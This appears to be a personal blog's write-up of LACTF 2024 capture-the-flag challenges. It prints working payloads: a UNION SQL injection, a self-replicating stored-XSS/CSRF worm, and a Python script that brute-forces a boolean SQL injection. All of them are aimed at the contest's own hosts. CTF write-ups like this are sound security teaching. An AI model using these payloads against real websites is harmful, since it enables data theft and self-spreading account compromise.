@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="OpenOpen to any detailed questions, please DM me on Discord or down below. web&#x2F;flaglangThe code strictly limits the acquisition to flag only when the request cookie contains the specific password">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LACTF 2024-Writeup">
+<meta property="og:url" content="https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/index.html">
+<meta property="og:site_name" content="Zhong&#39;s Blog">
+<meta property="og:description" content="OpenOpen to any detailed questions, please DM me on Discord or down below. web&#x2F;flaglangThe code strictly limits the acquisition to flag only when the request cookie contains the specific password">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/19-52-28-bae5deebe0a57eb73f37aa61869ae36a.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/19-53-47-631792f5d60bbc32ff95bb9bd357dacf.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/19-56-48-5266bdb115bb9c9881982b0c3227bbec.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/19-58-21-4b7585bea3b94d2d34a031a23c254b52.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/03-27-57-b7829c5431161413d9ca67541199bdcd.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/19-45-19-118f6512bcabd020515c94174b84985e.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-04-41-19e70f644ce932262975d2aa67362735.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-07-17-3e685682bb01015bad86ba595d3486c1.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-18-25-234bd3f3df2c8cd183ea26c2699ceac4.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-10-34-1c27843ced2e5fe2e8fe537e57de8774.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-14-48-6ea705c4eb99dad57a9d2819d8a2150f.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/12-55-15-27f1cd437d09089823e7f0548f74b57f.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-16-55-21a6f0d772fc2e94b98e93e6826614f8.png">
+<meta property="og:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/20-18-09-dee4fa67128f2694dd3a33297dfde480.png">
+<meta property="article:published_time" content="2024-02-19T01:24:33.000Z">
+<meta property="article:modified_time" content="2024-02-19T01:31:41.774Z">
+<meta property="article:author" content="2h0ng, Zhong">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.2h0ng.wiki/noteimages/2024/02/18/19-52-28-bae5deebe0a57eb73f37aa61869ae36a.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>LACTF 2024-Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-JRNNF9TMHE"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-JRNNF9TMHE');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/09/OSCP%20Cheat%20Sheet%20/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&text=LACTF 2024-Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&is_video=false&description=LACTF 2024-Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LACTF 2024-Writeup&body=Check out this article: https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&name=LACTF 2024-Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&t=LACTF 2024-Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Open"><span class="toc-number">1.</span> <span class="toc-text">Open</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-flaglang"><span class="toc-number">2.</span> <span class="toc-text">web&#x2F;flaglang</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-la-housing-portal"><span class="toc-number">3.</span> <span class="toc-text">web&#x2F;la housing portal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-new-housing-portal"><span class="toc-number">4.</span> <span class="toc-text">web&#x2F;new-housing-portal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-pogn"><span class="toc-number">5.</span> <span class="toc-text">web&#x2F;pogn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-penguin-login"><span class="toc-number">6.</span> <span class="toc-text">web&#x2F;penguin-login</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rev-aplet321"><span class="toc-number">7.</span> <span class="toc-text">rev&#x2F;aplet321</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        LACTF 2024-Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">2h0ng, Zhong</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-19T01:24:33.000Z" class="dt-published" itemprop="datePublished">2024-02-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Open"><a href="#Open" class="headerlink" title="Open"></a>Open</h1><p>Open to any detailed questions, please DM me on Discord or down below.</p>
+<h1 id="web-flaglang"><a href="#web-flaglang" class="headerlink" title="web&#x2F;flaglang"></a>web&#x2F;flaglang</h1><p>The code strictly limits the acquisition to flag only when the request cookie contains the specific password same as the randomly generated one, which would normally be impossible to guess. Yet we can simply bypass this limitation by removing the cookie.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/19-52-28-bae5deebe0a57eb73f37aa61869ae36a.png" alt="image-20240218195228462"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/view?country=Flagistan</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>flaglang.chall.lac.tf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/19-53-47-631792f5d60bbc32ff95bb9bd357dacf.png" alt="image-20240218195346984"></p>
+<h1 id="web-la-housing-portal"><a href="#web-la-housing-portal" class="headerlink" title="web&#x2F;la housing portal"></a>web&#x2F;la housing portal</h1><p>All arguments at <code>/submit</code> API, except for <code>name</code> , are collected and used in constructing a SQL query statement, which is vulnerable to SQL injection, and comment symbols are filtered out.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/19-56-48-5266bdb115bb9c9881982b0c3227bbec.png" alt="image-20240218195648631"></p>
+<p>My strategy is to remove all arguments but <code>guests</code> and conduct a union injection to retrieve the flag.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/submit</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>la-housing.chall.lac.tf</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">name</span>=<span class="number">1</span>&amp;guests=<span class="number">1</span>&#x27;+union+select+<span class="number">1</span>,(select+Flag+from+flag),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,&#x27;<span class="number">6</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/19-58-21-4b7585bea3b94d2d34a031a23c254b52.png" alt="image-20240218195821376"></p>
+<h1 id="web-new-housing-portal"><a href="#web-new-housing-portal" class="headerlink" title="web&#x2F;new-housing-portal"></a>web&#x2F;new-housing-portal</h1><p>Core Concepts: XSS + CSRF</p>
+<p>Technique: Bypassing innerHTML with event handlers + code worm self-replication</p>
+<p>The username field is vulnerable to stored XSS attacks. Since the username is fetched via Ajax and then inserted into the page using innerHTML, directly inserting a script tag won’t automatically execute (because window.load has already finished executing). However, event handlers can be used.</p>
+<p>Therefore, the payload is slightly more complex, utilizing the onerror event to execute the contents of a script tag. Then, the script tag contains a worm-like self-replicating code, necessary because the entire payload needs to be included as the value of a request parameter in the constructed CSRF request.</p>
+<p>Final payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="built_in">eval</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;worm&#x27;</span>).<span class="property">innerHTML</span>)&gt;&lt;script id=worm&gt;var headerTag=&quot;&lt;script id=worm&gt;&quot;; var jsCode = document.getElementById(&quot;worm&quot;).innerHTML; var tailTag = &quot;&lt;/&quot; + &quot;script&gt;&quot;; var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;https://new-housing-portal.chall.lac.tf/finder&quot;); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); xhr.send(&quot;username=&quot;+&quot;&lt;img src=1 onerror=eval(document.getElementById(&#x27;worm&#x27;).innerHTML)&gt;&quot;+wormCode); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/03-27-57-b7829c5431161413d9ca67541199bdcd.png" alt="image-20240218032756773"></p>
+<h1 id="web-pogn"><a href="#web-pogn" class="headerlink" title="web&#x2F;pogn"></a>web&#x2F;pogn</h1><p>Simply create a Websocket connection through Burp Suite, and wait until the ball hits outside of the boundary.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/19-45-19-118f6512bcabd020515c94174b84985e.png" alt="image-20240218194518551"></p>
+<h1 id="web-penguin-login"><a href="#web-penguin-login" class="headerlink" title="web&#x2F;penguin-login"></a>web&#x2F;penguin-login</h1><p>There is a SQL injection vulnerability with a more strict filter which bans all special characters except <code>&#123; _ &#125;&#39;</code>. The filter also bans the <code>LIKE</code> expression.</p>
+<p> The SQL injection vulnerability can only be exploited by error-based injection and boolean injection. The former seems impossible to my best knowledge, and we can use the <code>SIMILAR TO</code> <a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-SIMILARTO-REGEXP">expression</a> as an alternative to <code>LIKE</code> for conducting boolean injection.</p>
+<p><code>SIMILAR TO</code> expression provides the <code>_</code> pattern the same as <code>.</code> in POSIX regular expressions.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-04-41-19e70f644ce932262975d2aa67362735.png" alt="image-20240218200440971"></p>
+<p>We can leverage <code>_</code> to guess the real length of the flag, then craft a script to brute force it out.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-07-17-3e685682bb01015bad86ba595d3486c1.png" alt="image-20240218200716973"></p>
+<p>The script:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &#x27;https://penguin.chall.lac.tf/submit&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">initial_payload = &quot;1&#x27; or name SIMILAR TO &#x27;lactf&#123;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char_set = [chr(i) for i in range(97, 123)] + \</span><br><span class="line">           [chr(i) for i in range(65, 91)] + \</span><br><span class="line">           [chr(i) for i in range(48, 58)] + \</span><br><span class="line">           [&#x27;_&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [&#x27;_&#x27;] * 38</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for index in range(len(flag)):</span><br><span class="line">    for char in char_set:</span><br><span class="line"></span><br><span class="line">        current_try = flag[:]</span><br><span class="line">        current_try[index] = char</span><br><span class="line">        payload = initial_payload + &#x27;&#x27;.join(current_try) + &quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">        data = &#123;&#x27;username&#x27;: payload&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        response = requests.post(url, data=data, headers=&#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if &quot;We found a penguin!!!!!&quot; in response.text:</span><br><span class="line">            flag[index] = char  </span><br><span class="line">            print(&quot;Progress:&quot;, &#x27;&#x27;.join(flag))</span><br><span class="line">            break  </span><br><span class="line"></span><br><span class="line">print(&quot;Final flag:lactf&#123;&quot;, &#x27;&#x27;.join(flag) ,&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-18-25-234bd3f3df2c8cd183ea26c2699ceac4.png" alt="image-20240218201825305"></p>
+<p>One thing remaining to consider is that any number followed by <code>&#123;</code> in the <code>SIMILAR TO</code> expression would trigger an <code>invalid repetition counts error</code>, due to <code>&#123;</code> having its special meaning as its a regular pattern too, and any number at this position would throw an error.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-10-34-1c27843ced2e5fe2e8fe537e57de8774.png" alt="image-20240218201034355"></p>
+<p>So we have to finalize this flag element by a normal query API.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-14-48-6ea705c4eb99dad57a9d2819d8a2150f.png" alt="image-20240218201448440"></p>
+<p>The real element is indeed a number 9.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/12-55-15-27f1cd437d09089823e7f0548f74b57f.png" alt="image-20240218125515643"></p>
+<h1 id="rev-aplet321"><a href="#rev-aplet321" class="headerlink" title="rev&#x2F;aplet321"></a>rev&#x2F;aplet321</h1><p>Reverse engineer the binary, and craft the script by reversing the logics.</p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-16-55-21a6f0d772fc2e94b98e93e6826614f8.png" alt="image-20240218201655489"></p>
+<p>Script:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Calculate the occurrences of &quot;please&quot; and &quot;pretty&quot;</span><br><span class="line">please_count = 39</span><br><span class="line">pretty_count = 15</span><br><span class="line"></span><br><span class="line"># Construct a string containing enough &quot;please&quot; and &quot;pretty&quot;</span><br><span class="line"># and include &quot;flag&quot; to meet the conditions</span><br><span class="line">input_string = &quot;please&quot; * please_count + &quot;pretty&quot; * pretty_count + &quot;flag&quot;</span><br><span class="line"></span><br><span class="line"># Print the generated string, which is part of the program input</span><br><span class="line">print(input_string)</span><br><span class="line"></span><br><span class="line"># Verify the length and content of the string</span><br><span class="line">print(&quot;Length of the input string:&quot;, len(input_string))</span><br><span class="line">print(&quot;Occurrences of &#x27;please&#x27;:&quot;, input_string.count(&quot;please&quot;))</span><br><span class="line">print(&quot;Occurrences of &#x27;pretty&#x27;:&quot;, input_string.count(&quot;pretty&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/02/18/20-18-09-dee4fa67128f2694dd3a33297dfde480.png" alt="image-20240218201809426"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Open"><span class="toc-number">1.</span> <span class="toc-text">Open</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-flaglang"><span class="toc-number">2.</span> <span class="toc-text">web&#x2F;flaglang</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-la-housing-portal"><span class="toc-number">3.</span> <span class="toc-text">web&#x2F;la housing portal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-new-housing-portal"><span class="toc-number">4.</span> <span class="toc-text">web&#x2F;new-housing-portal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-pogn"><span class="toc-number">5.</span> <span class="toc-text">web&#x2F;pogn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-penguin-login"><span class="toc-number">6.</span> <span class="toc-text">web&#x2F;penguin-login</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rev-aplet321"><span class="toc-number">7.</span> <span class="toc-text">rev&#x2F;aplet321</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&text=LACTF 2024-Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&is_video=false&description=LACTF 2024-Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LACTF 2024-Writeup&body=Check out this article: https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&title=LACTF 2024-Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&name=LACTF 2024-Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2024/02/18/LACTF-2024/&t=LACTF 2024-Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    2h0ng, Zhong
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zhong-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
